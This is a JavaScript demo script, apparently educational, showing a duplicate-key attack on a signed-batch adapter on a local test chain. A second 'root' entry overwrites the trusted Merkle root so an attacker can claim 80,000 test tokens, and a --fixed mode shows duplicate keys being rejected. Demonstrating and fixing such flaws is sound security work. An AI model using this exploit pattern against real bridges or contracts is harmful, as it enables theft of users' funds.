// Attack #4: the duplicate that rewrote the root. Verifiers sign a batch of key/value updates.
// The adapter checks the first "root" entry against the source checkpoint, then applies every
// entry, so a second "root" in the same signed batch replaces the trusted root unchecked.
//   node demos/04-dupe.mjs           the second entry becomes the root; the attacker claims 80,000
//   node demos/04-dupe.mjs --fixed   any key that appears twice rejects the whole batch
import { keccak256, encodeAbiParameters, parseAbiParameters, stringToHex } from "viem";
import { startChain, stopChains, roles, verifiers, abis, sigsFrom, units, fmt } from "../lib/chain.mjs";
import { session } from "../lib/term.mjs";

const fixed = process.argv.includes("--fixed");
const t = session(fixed ? "dupe-fixed" : "dupe", fixed ? "Duplicate key, fixed" : "Duplicate key");
const B = await startChain({ id: 31338, name: "chain B" });

// A release root is a one-leaf tree here: root = hash(recipient, amount).
const leaf = (to, amt) => keccak256(encodeAbiParameters(parseAbiParameters("address, uint256"), [to, amt]));
const real = leaf(roles.user.address, units(2_000));     // the checkpoint's genuine root
const evil = leaf(roles.attacker.address, units(80_000)); // the attacker's root

const token = await B.deploy("token", ["Test rsETH", "tRSETH", 18]);
const kind = fixed ? "rootBookFixed" : "rootBook"; // --fixed only picks which adapter is deployed
const book = await B.deploy(kind, [token, real, verifiers.map((v) => v.address), 2n]);
await B.send(roles.relayer, token, abis.token, "mint", [book, units(80_000)]);
const rootName = async () => ((await B.read(book, abis[kind], "trustedRoot")) === real ? "checkpoint root" : "ATTACKER'S ROOT");
t.say(`adapter holds ${fmt(await B.balanceOf(token, book))} tRSETH · root = ${await rootName()}`);

const key = (s) => stringToHex(s, { size: 32 });
const batch = [
  { key: key("fee"), value: `0x${"0".repeat(63)}5` },
  { key: key("root"), value: real },
  { key: key("root"), value: evil },
];
const d = keccak256(encodeAbiParameters(
  [{ type: "uint256" }, { type: "uint256" }, { type: "tuple[]", components: [{ name: "key", type: "bytes32" }, { name: "value", type: "bytes32" }] }],
  [B.id, 4n, batch]));
const sigs = await sigsFrom(verifiers.slice(0, 2), d);
t.cmd(`signed batch: fee=5 · root=checkpoint · root=attacker`);
const r = await B.attempt(roles.relayer, book, abis[kind], "applyBatch", [4n, batch, sigs]);
if (r.ok) t.bad(`  ✓ applied · root = ${await rootName()}`); else t.ok(`  ✗ reverted: ${r.name}`);

t.cmd(`attacker → claim(80,000)`);
const c = await B.attempt(roles.attacker, book, abis[kind], "claim", [roles.attacker.address, units(80_000)]);
if (c.ok) t.bad(`  ✓ claimed against the new root`); else t.ok(`  ✗ reverted: ${c.name}`);
// The verdict comes from the attacker's balance, not from the flag.
const got = await B.balanceOf(token, roles.attacker.address);
t.big(got > 0n ? `ROOT REWRITTEN · attacker took ${fmt(got)}` : `ROOT INTACT · attacker took ${fmt(got)}`);
t.save(); stopChains(); process.exit(0);
